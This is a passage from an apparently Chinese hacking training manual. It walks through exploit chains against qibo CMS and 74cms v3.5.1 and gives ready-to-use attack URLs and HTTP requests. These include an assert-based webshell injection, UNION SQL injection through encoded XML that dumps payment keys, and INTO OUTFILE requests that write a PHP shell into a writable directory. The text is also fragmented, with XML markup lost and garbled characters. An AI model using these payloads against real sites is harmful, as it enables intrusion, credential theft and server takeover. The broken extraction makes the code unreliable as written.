isset($id) && $id = intval($id);
- 180 -
isset($fup) && $aid = intval($fup);
isset($aid) && $aid = intval($aid);
isset($rid) && $rid = intval($rid);
isset($fid) && $fid = intval($fid);
isset($cid) && $cid = intval($cid);
isset($cityid) && $cityid = intval($cityid);
可以看到 city_id 在全局文件中被 intval 了。
再看到 search.php 中
$postdb[city_id]
&&
$city_id
=
$postdb[city_id
$postdb[street_id]
&&
$street_id
=
$postdb[street_
$postdb[zone_id]
&&
$zone_id
=
$postdb[zone_id
@include_once(ROOT_PATH."data/zone/$city_id.php");//
包含
$city_fid=select_where("{$_pre}city","'postdb[city_i
d]'
onChange=\"choose_where('getzone',this.options[this.
selectedIndex].value,'','1','')\"",$city_id);
全局有转义 截断不了
但是因为 qibo 的特殊性 在 qibo 的后台文件当中
function_exists('html') OR exit('ERR');
所以直接访问是不行的。
是这样判断的 所以我们就算不能截断 我们可以直接把后台的文件包含
进来 然后进而操作后台。
所以 qibo 在操作包含的文件中都用正则来过滤了, 却遗漏了这里。
- 181 -
但是打开 do/js.php 发现
query("INSERT INTO `{$pre}jfabout`
( `fid` , `title` , `content`, `list` ) VALUES ( '$fid',
'$title', '$content', '$list' )");
- 182 -
jump("添加成功
","index.php?lfj=jfadmin&job=listjf&fid=$fid",1);
}
这里入库了。
再看到 do/jf.php 中
$lfjdb && $lfjdb[money]=get_money($lfjdb[uid]);
$query = $db->query("SELECT * FROM {$pre}jfsort ORDER
BY list");
while($rs = $db->fetch_array($query)){
$fnameDB[$rs[fid]]=$rs[name];
$query2 = $db->query("SELECT * FROM
{$pre}jfabout WHERE fid='$rs[fid]' ORDER BY list");//
这里默认查的都是 1 所以入库的时候 fid 弄为 1
while($rs2 = $db->fetch_array($query2)){
eval("\$rs2[title]=\"$rs2[title]\";");//就
eval 了。
eval("\$rs2[content]=\"$rs2[content]\";");
$jfDB[$rs[fid]][]=$rs2;
}
}
准备写一句话的时候,却发现了
在 inc/common.inc.php 中
function Add_S($array){
foreach($array as $key=>$value){
@eregi("['\\\"]+",$key) && die('ERROR
KEY!');
if(!is_array($value)){
- 183 -
$value=str_replace("&#x","& #
x",$value);
//过滤一些不安全字符
$value=preg_replace("/eval/i","eva l",$value);
//过滤不安全函数
!get_magic_quotes_gpc() &&
$value=addslashes($value);
$array[$key]=$value;
}else{
$array[$key]=Add_S($array[$key]);
}
}
return $array;
}
把 eval 替换了,这样我们就用 assert 把。
http://web/new/fenlei/search.php?mid=1&action=search&key
word=asd&postdb[city_id]=../../admin/hack&hack=jfadmin&a
ction=addjf&Apower[jfadmin_mod]=1&fid=1&title=${@assert
($_POST[yu])}
http://web/new/fenlei/do/jf.php
POST：yu=phpinfo();
随便找了个测试了下
http://**.**.**.**/do/jf.php
- 184 -
漏洞组合
骑士漏洞组合可致所有数据泄露+getshell
作者：龟兔赛跑
刚下了个 74cms_v3.5.1_20141027.zip，diff 了一下发现了下面的改
动：
diff -Nurp upload.1020/plus/weixin.php
upload.1027/plus/weixin.php
--- upload.1020/plus/weixin.php
2014-10-18
12:14:22.000000000 +0800
+++ upload.1027/plus/weixin.php
2014-10-25
14:45:22.000000000 +0800
@@ -21,10 +21,10 @@ class wechatCallbackapiTest extends
mysq
}
public function responseMsg()
{
-
if(!$this->checkSignature())
- 185 -
-
{
-
exit();
-
}
+
// if(!$this->checkSignature())
+
// {
+
//
exit();
+
//
}
$postStr =
addslashes($GLOBALS["HTTP_RAW_POST_DATA"]);
if (!empty($postStr))
{
注释调了 checkSignature()，是为了啥？？？？？
http://**.**.**.**/bugs/wooyun-2014-075009 曾经分析过这里
的 XXE 漏洞以及 SQLI，不过，被次利用的是另外两个 BUG。
先看 code.
class wechatCallbackapiTest extends mysql
{
public function valid()
{
$echoStr = $_GET["echostr"];
if($this->checkSignature())
{
exit($echoStr);
}
}
public function responseMsg()
{
// if(!$this->checkSignature())
// {
//
exit();
//
}
- 186 -
$postStr =
addslashes($GLOBALS["HTTP_RAW_POST_DATA"]);
if (!empty($postStr))
{
//
libxml_disable_entity_loader(true);
$postObj = simplexml_load_string($postStr,
'SimpleXMLElement', LIBXML_NOCDATA);
$fromUsername = $postObj->FromUserName;
$toUsername = $postObj->ToUserName;
$keyword = trim($postObj->Content);
$keyword =
utf8_to_gbk($keyword);
$keyword =
addslashes($keyword);
$time = time();
$event = trim($postObj->Event);
if ($event === "subscribe")
{
$word=
"»ØžŽj·µ»ØœôŒ±ÕÐÆž£¬»ØžŽn·µ»Ø×îÐÂÕÐÆž£¡Äú¿ÉÒÔ³¢ÊÔÊäÈ
ëÖ°Î»Ãû³ÆÈç¡°»áŒÆ¡±£¬ÏµÍ³œ«»á·µ»ØÄúÒªÕÒµÄÐÅÏ¢£¬ÎÒÃÇÅ
¬ÁŠŽòÔì×îÈËÐÔ»¯µÄ·þÎñÆœÌš£¬Ð»Ð»¹Ø×¢¡£";
$this->exit_word_message($word,$fromUsername,
$toUsername,$time);
}
$default_pic=ROOT."/data/images/".DEFAULT_PIC
;
$first_pic=ROOT."/data/images/".FIRST_PIC;
if($event === "CLICK"){
- 187 -
if($_CFG['weixin_apiopen']=='0')
{
$word="ÍøÕŸÎ¢ÐÅœÓ¿ÚÒÑŸ¹Ø±Õ";
$this->exit_word_message($word,$fromUsername,
$toUsername,$time);
}
if($postObj->EventKey=="binding"){
$usinfo =
$this->get_user_info($fromUsername);
if(!empty($usinfo)){
$word="ÄúÒÑŸ°ó¶š¹ýÁË!";
}else{
$word="ÇëÊäÈëÄúµÄÕËºÅÃÜÂë.
ÀýÈç:ÕÅÈý/123456";
}
$this->exit_word_message($word,$fromUsername,
$toUsername,$time);
}
...
private function get_user_info($fromUsername){
$usinfo = array();
$usinfo_obj = $this->query("select *
from ".table('members')." where
weixin_openid='".$fromUsername."' limit 1");
while($row =
$this->fetch_array($usinfo_obj)){
- 188 -
$usinfo = $row;
}
return $usinfo;
}
$postStr = addslashes($GLOBALS["HTTP_RAW_POST_DATA"]);
对整个 POST_DATA 做了 addslashes。
$postObj = simplexml_load_string($postStr,
'SimpleXMLElement', LIBXML_NOCDATA);
$fromUsername = $postObj->FromUserName;
$usinfo = $this->get_user_info($fromUsername);
===>
$this->query("select * from ".table('members')." where
weixin_openid='".$fromUsername."' limit 1");
$fromUsername 从 simplexml_load_string()后就直接进入了 SQL
中，addslashes($GLOBALS["HTTP_RAW_POST_DATA"])就解决了
所有问题么？答案是否定的。因为 XML 中特殊字符也可以编码：
特殊字符 特殊含义 实体编码
> 开始标记 &gt;
exit_word_message($word,$fromUsername,
$toUsername,$time);
}
不过，这里的$_CFG['weixin_apiopen']真的有效么？下面的代码可以
告诉我们：
myprint();
?>
在浏览器访问一下**.**.**.**:8081/74cms/test.php，结果为：
in file =0
Notice: Undefined variable: _CFG in
/var/www/html/74cms/test.php on line 7
- 190 -
Notice: Undefined variable: _CFG in
/var/www/html/74cms/test.php on line 7
in class=
也就是在 class object 里面访问$_CFG 是无效的。
那么，那么，
$_CFG['weixin_apiopen']=='0'
这个条件就是永远都不会成立的，不管你后台开不开 weixin_api。
好了，所有条件限制都排除了，可以直接注入了。
一下为 74cms_v3.5.1_20141027 默认安装测试：
POST
/74cms/plus/weixin.php?signature=da39a3ee5e6b4b0d325
5bfef95601890afd80709 HTTP/1.1
Content-Type: application/xml
User-Agent: http4e/5.0.12
Host: **.**.**.**:8081
Content-Length: 155
111
1111&apos;
2222
CLICK
binding
UNION SELECT:
- 191 -
POST
/74cms/plus/weixin.php?signature=da39a3ee5e6b4b0d325
5bfef95601890afd80709 HTTP/1.1
Content-Type: application/xml
User-Agent: http4e/5.0.12
Host: **.**.**.**:8081
Content-Length: 226
111
1111&apos; union select
1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,2
1,22#
2222
CLICK
binding
获取支付相关的 key：
POST
/74cms/plus/weixin.php?signature=da39a3ee5e6b4b0d325
5bfef95601890afd80709 HTTP/1.1
Content-Type: application/xml
User-Agent: http4e/5.0.12
Host: **.**.**.**:8081
Content-Length: 303
111
1111&apos; union select (select
group_concat(id,0x7c,typename,0x7c,ytauthkey,0x5d)
from
- 192 -
qs_payment),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,
18,19,20,21,22#
2222
CLICK
apply_jobs
getshell:
POST
/74cms/plus/weixin.php?signature=da39a3ee5e6b4b0d325
5bfef95601890afd80709 HTTP/1.1
Content-Type: application/xml
User-Agent: http4e/5.0.12
Host: **.**.**.**:8081
Content-Length: 324
111
1111&apos; union select
0x3C3F70687020706870696E666F28293B3F3E,2,3,4,5,6,7,8,
9,10,11,12,13,14,15,16,17,18,19,20,21,22 INTO OUTFILE
&apos;/var/www/html/74cms/data/shell.php&apos;
#
2222
CLICK
binding
这是因为写 shell.php 需要有写权限，data 目录不行。
但是，但是，我们也可以找一个肯定有写权限的目录：
注册一个普通用户，长传一个头像，这是会建立 0777 权限的目录：
'data/avatar/100/2014',shell 就传到这个目录吧。
- 193 -
POST
/74cms/plus/weixin.php?signature=da39a3ee5e6b4b0d325
5bfef95601890afd80709 HTTP/1.1
Content-Type: application/xml
User-Agent: http4e/5.0.12
Host: **.**.**.**:8081
Content-Length: 340
111
1111&apos; union select
0x3C3F70687020706870696E666F28293B3F3E,2,3,4,5,6,7,8,
9,10,11,12,13,14,15,16,17,18,19,20,21,22 INTO OUTFILE
&apos;/var/www/html/74cms/data/avatar/100/2014/shell.
php&apos; #
2222
CLICK
binding
- 194 -
Dark' Evil
培训教材